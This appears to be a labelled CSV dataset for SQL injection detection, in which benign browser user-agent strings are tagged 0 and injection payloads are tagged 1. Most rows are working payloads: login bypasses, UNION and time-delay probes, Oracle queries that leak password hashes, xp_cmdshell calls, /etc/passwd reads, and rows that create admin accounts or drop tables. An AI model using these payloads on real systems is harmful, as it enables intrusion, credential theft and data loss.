Sentence,Label
Mozilla / 5 . 0  ( Linux ;  U ;  Android 4 . 0 . 3 ;  en-us )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 31 . 0 . 1650 . 59 Mobile Safari / 537 . 36,0
Mozilla / 5 . 0  ( Windows NT 6 . 3 ;  Trident / 7 . 0 ;  Touch ;  TNJB ;  rv:11 . 0 )  like Gecko,0
Mozilla / 5 . 0  ( iPad ;  CPU OS 8_1_3 like Mac OS X )  AppleWebKit / 600 . 1 . 4  ( KHTML  like Gecko )  Mobile / 12B466,0
Mozilla / 5 . 0  ( compatible ;  MSIE 9 . 0 ;  Windows NT 6 . 1 ;  WOW64 ;  Trident / 5 . 0 ;  Active Content Browser ) ,0
Mozilla / 4 . 0  ( compatible ;  MSIE 7 . 0 ;  Windows NT 6 . 1 ;  WOW64 ;  Trident / 7 . 0 ;  SLCC2 ;   . NET CLR 2 . 0 . 50727 ;   . NET CLR 3 . 5 . 30729 ;   . NET CLR 3 . 0 . 30729 ;   . NET4 . 0C ;   . NET4 . 0E ) ,0
Mozilla / 5 . 0  ( Windows NT 5 . 1 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 44 . 0 . 2403 . 130 Safari / 537 . 36,0
Mozilla / 5 . 0  ( Windows NT 10 . 0 ;  WOW64 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 43 . 0 . 2357 . 124 Safari / 537 . 36,0
Mozilla / 4 . 0  ( compatible ;  MSIE 7 . 0 ;  Windows NT 6 . 1 ;  Trident / 6 . 0 ;  SLCC2 ;   . NET CLR 2 . 0 . 50727 ;   . NET CLR 3 . 5 . 30729 ;   . NET CLR 3 . 0 . 30729 ;  Media Center PC 6 . 0 ;   . NET4 . 0C ;   . NET4 . 0E ;  InfoPath . 3 ) ,0
Mozilla / 5 . 0  ( Macintosh ;  Intel Mac OS X 10_9_5 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 43 . 0 . 2357 . 81 Safari / 537 . 36,0
Mozilla / 5 . 0  ( compatible ;  MSIE 10 . 0 ;  Windows NT 6 . 2 ;  Win64 ;  x64 ;  Trident / 6 . 0 ;  WebView / 1 . 0 ) ,0
Mozilla / 5 . 0  ( Windows NT 6 . 3 ;  WOW64 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 44 . 0 . 2403 . 89 Safari / 537 . 36,0
Mozilla / 5 . 0  ( Windows NT 5 . 1 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 43 . 0 . 2357 . 130 Safari / 537 . 36,0
Mozilla / 5 . 0  ( Windows NT 6 . 1 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 40 . 0 . 2214 . 91 Safari / 537 . 36,0
Mozilla / 5 . 0  ( iPad ;  U ;  CPU OS 5_0 like Mac OS X )  AppleWebKit / 534 . 46  ( KHTML  like Gecko )  Version / 5 . 1 Mobile / 9A334 Safari / 7534 . 48 . 3,0
Mozilla / 5 . 0  ( Windows NT 5 . 1 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 42 . 0 . 2311 . 135 Safari / 537 . 36,0
Mozilla / 5 . 0  ( Macintosh ;  Intel Mac OS X 10_10_2 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 43 . 0 . 2357 . 130 Safari / 537 . 36,0
Mozilla / 5 . 0  ( Windows NT 6 . 1 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  coc_coc_browser / 50 . 0 . 125 Chrome / 44 . 0 . 2403 . 125 Safari / 537 . 36,0
Mozilla / 5 . 0  ( compatible ;  MSIE 10 . 0 ;  Windows NT 6 . 1 ;  WOW64 ;  Trident / 6 . 0 ;  SLCC2 ;   . NET CLR 2 . 0 . 50727 ;   . NET4 . 0C ;   . NET4 . 0E ) ,0
Mozilla / 5 . 0  ( Macintosh ;  Intel Mac OS X 10_10_5 )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  Chrome / 43 . 0 . 2357 . 124 Safari / 537 . 36,0
Mozilla / 5 . 0  ( Windows NT 6 . 3 ;  Win64 ;  x64 ;  Trident / 7 . 0 ;  MAARJS ;  rv:11 . 0 )  like Gecko,0
Mozilla / 5 . 0  ( Linux ;  Android 5 . 0 ;  SAMSUNG SM-N900T Build / LRX21V )  AppleWebKit / 537 . 36  ( KHTML  like Gecko )  SamsungBrowser / 2 . 1 Chrome / 34 . 0 . 1847 . 76 Mobile Safari / 537 . 36,0
Mozilla / 5 . 0  ( iPhone ;  CPU iPhone OS 8_4 like Mac OS X )  AppleWebKit / 600 . 1 . 4  ( KHTML  like Gecko )  GSA / 7 . 0 . 55539 Mobile / 12H143 Safari / 600 . 1 . 4,0
a' or 1 = 1 ;  --,1
1' or '1'  =  '1' -- ,1
1' or '1'  =  '1' #,1
"1"" or ""1""  =  ""1"" -- ",1
"1"" or ""1""  =  ""1"" #",1
' and 1 = 0 )  union all,1
? or 1 = 1 --,1
x' and userid is NULL ;  --,1
x' and email is NULL ;  --,1
anything' or 'x' = 'x,1
x' and 1 =  ( select count ( * )  from tabname )  ;  --,1
x' and members.email is NULL ;  --,1
x' or full_name like '%bob%,1
23 or 1 = 1 ;  --,1
' ;  exec master..xp_cmdshell 'ping 172.10.1.255'--,1
1 or 1 = 1,1
1' or '1' = '1,1
1 and user_name (  )   =  'dbo',1
1 exec sp_  ( or exec xp_ ) ,1
1 and 1 = 1,1
1' and 1 =  ( select count ( * )  from tablenames )  ;  --,1
1 and user_name (  )   =  'dbo',1
 \ ' ;  desc users ;  --,1
1 \ '1,1
1' and non_existant_table  =  '1,1
' or username is not NULL or username  =  ',1
"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )   >  116",1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --",1
1 uni / ** / on select all from where,1
â€™ or â€˜1â€™ = â€™1,1
' or '1' = '1,1
' |  | utl_http.request ( 'httP :  /   / 192.168.1.1 / ' )  |  | ',1
"'  |  |  myappadmin.adduser ( 'admin', 'newpass' )   |  |  '",1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"' |  |  ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1
 |  | 6,1
' |  | '6,1
 (  |  | 6 ) ,1
' or 1 = 1-- ,1
or 1 = 1,1
' or '1' = '1,1
 ;  or '1' = '1',1
""" or isNULL ( 1 / 0 )   / *",1
' or '7659' = '7659,1
""" or isNULL ( 1 / 0 )   / *",1
' or 1 = 1--,1
""" or 1 = 1--",1
' or 1 = 1  / *,1
or 1 = 1--,1
' or 'a' = 'a,1
""" or ""a"" = ""a",1
' )  or  ( 'a' = 'a,1
admin' or ',1
' select * from information_schema.tables--,1
 )  union select * from information_schema.tables ; ,1
' having 1 = 1--,1
' having 1 = 1--,1
' group by userid having 1 = 1--,1
' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1
' or 1 in  ( select @@version ) --,1
' union all select @@version--,1
' or 'unusual'  =  'unusual',1
' or 'something'  =  'some'+'thing',1
' or 'text'  =  n'text',1
' or 'something' like 'some%',1
' or 2  >  1,1
' or 'text'  >  't',1
' or 'whatever' in  ( 'whatever' ) ,1
' or 2 between 1 and 3,1
' or username like char ( 37 )  ; ,1
"' union select * from users where login  =  char ( 114,111,111,116 )  ; ",1
' union select ,1
password:* /  = 1--,1
uni / ** / on sel / ** / ect,1
' ;  execute immediate 'sel'  |  |  'ect us'  |  |  'er',1
' ;  exec  ( 'sel' + 'ect us' + 'er' ) ,1
' / ** / or / ** / 1 / ** /  =  / ** / 1,1
' or 1 / *,1
 or isNULL ( 1 / 0 )   / *,1
' or '7659' = '7659,1
""" or isNULL ( 1 / 0 )   / *",1
' --  & password = ,1
' ;  begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+' / '+password+' ' from users where login  >  ,1
@var select @var as var into temp end --,1
' and 1 in  ( select var from temp ) --,1
"' union select 1,load_file ( ' / etc / passwd' ) ,1,1,1 ; ",1
"1 ;  ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1 ; ",1
"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )   <  > char ( 39,39  )  )  ,1,0  )  )   ; ",1
' ;  exec master..xp_cmdshell 'ping 10.10.1.2'--,1
create user name identified by 'pass123',1
create user name identified by pass123 temporary tablespace temp default tablespace users ;  ,1
'  ;  drop table temp --,1
"exec sp_addlogin 'name' , 'password'",1
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  ",1
grant connect to name ;  grant resource to name ; ,1
"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ",1
' or 1 = 1 --,1
' union  ( select @@version )  --,1
"' union  ( select NULL,  ( select @@version  )  )   --",1
"' union  ( select NULL, NULL,  ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --",1
"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",1
"' ;  if not ( substring  (  (  select @@version ) ,25,1 )   <  >  0 )  waitfor delay '0:0:2' --",1
"' ;  if not ( substring  (  (  select @@version ) ,25,1 )   <  >  5 )  waitfor delay '0:0:2' --",1
"' ;  if not ( substring  (  (  select @@version ) ,25,1 )   <  >  8 )  waitfor delay '0:0:2' --",1
"' ;  if not ( substring  (  (  select @@version ) ,24,1 )   <  >  1 )  waitfor delay '0:0:2' --",1
' ;  if not ( select system_user )   <  >  'sa' waitfor delay '0:0:2' --,1
' ;  if is_srvrolemember ( 'sysadmin' )   >  0 waitfor delay '0:0:2' -- ,1
' ;  if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )    <  >  1 )  waitfor delay '0:0:2' --,1
' ;  if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )    <  >  0 )  waitfor delay '0:0:2' --,1
" select * from users where id = 1 or  (  \  )  = 1 union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or  (  \ . )  = 1 union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or  (  \ + )  = 1 or 1 = 1 -- 1,1
" select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
" select * from users where id = 1 or  (  \ + )  = 1 union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1
" select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or  \ . <  \  or 1 = 1 -- 1,1
 select * from users where id = 1 or  \ . < 1 or 1 = 1 -- 1,1
" select * from users where id = 1 or  \ . < 1 union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or  \ . <  \  union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or  \ . < $ or 1 = 1 -- 1,1
" select * from users where id = 1 or  \ . < $ union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or  \ . <   = 1 union select 1,@@VERSION -- 1",1
" select * from users where id = 1  |  | 1 union select 1,banner from v$version where rownum = 1 -- 1",1
" select * from users where id = 1  |  | 1 union select null,banner from v$version where rownum = 1 -- 1",1
 select * from users where id = 1   or 1 = 1 -- 1,1
 select * from users where id = 1 or  \ + <  \  or 1 = 1 -- 1,1
" select * from users where id = 1 or  1 < @ = 1 union select 1,version (  )  -- 1",1
" select * from users where id = 1 or  \ + <  \  union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or  \ + < $ union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or 1 & @# = 1 union select 1,version (  )  -- 1",1
" select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1
" select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or $ <  \  or 1 = 1 -- 1,1
 select * from users where id = 1 or $ <  \ . or 1 = 1 -- 1,1
" select * from users where id = 1 or $ <  \ . union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or $ <  \  union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or $+ <  \  or 1 = 1 -- 1,1
" select * from users where id = 1 or $+ < 1 union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or $+ <  \  union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or $+ < $ union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or  \  <  \ . or 1 = 1 -- 1,1
" select * from users where id = 1 or  \  <  \ . union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or  \  < 1 or 1 = 1 -- 1,1
" select * from users where id = 1 or  \  < 1 union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or  \  <  \  union select 1,@@VERSION -- 1",1
" select * from users where id = 1 or  \  <  \  union select null,@@VERSION -- 1",1
 select * from users where id = 1 or  \  < $ or 1 = 1 -- 1,1
" select * from users where id = 1 or  \  < $ union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or  \  <   = 1 or 1 = 1 -- 1,1
" select * from users where id = 1 or  \  <   = 1 union select 1,@@VERSION -- 1",1
 select * from users where id = 1 or ! < @ or 1 = 1 -- 1,1
" select * from users where id = 1 or ! < @ union select 1,version (  )  -- 1",1
" select * from users where id = 1 or @` \ ` union select 1,version (  )  -- 1",1
" select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1
" select * from users where id = 1 or @ < @ = 1 union select 1,version (  )  -- 1",1
 select * from users where id = 1 + (  \  )  or 1 = 1 -- 1,1
" select * from users where id = 1 + (  \  )  union select null,@@VERSION -- 1",1
" select * from users where id = 1. &  & 1 union select 1,version (  )  -- 1",1
 select * from users where id = 1. or 1 = 1 -- 1,1
" select * from users where id = 1. &  & @ union select 1,version (  )  -- 1",1
 select * from users where id = 1 +  (  \ . )  or 1 = 1 -- 1,1
" select * from users where id = 1 +  (  \ . )  union select null,@@VERSION -- 1",1
" select * from users where id = 1.  union select 1,version (  )  -- 1",1
" select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1
" select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1
" select * from users where id = 1. union select null,version (  )  -- 1",1
" select * from users where id = 1 + \ . union select null,@@VERSION -- 1",1
" select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1
 select * from users where id = 1.  < @ or 1 = 1 -- 1,1
 select * from users where id = 1. < @. or 1 = 1 -- 1,1
" select * from users where id = 1. < @. union select 1,version (  )  -- 1",1
 select * from users where id = 1.*1 or 1 = 1 -- 1,1
" select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1
" select * from users where id = 1. < 1# union select 1,version (  )  -- 1",1
" select * from users where id = 1.  < @ union select 1,version (  )  -- 1",1
" select * from users where id = 1.  < @ union select version (  ) ,version (  )  -- 1",1
" select * from users where id = 1.* \  union select null,@@VERSION -- 1",1
 select * from users where id = 1. < @$ or 1 = 1 -- 1,1
" select * from users where id = 1. < @$ union select 1,version (  )  -- 1",1
 select * from users where id = 1.%@ or 1 = 1 -- 1,1
" select * from users where id = 1.%@ union select 1,version (  )  -- 1",1
" select * from users where id = 11 |  | 1 union select 1,banner from v$version where rownum = 1 -- 1",1
 select * from users where id = 1 +1 or 1 = 1 -- 1,1
 select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1
" select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
" select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1",1
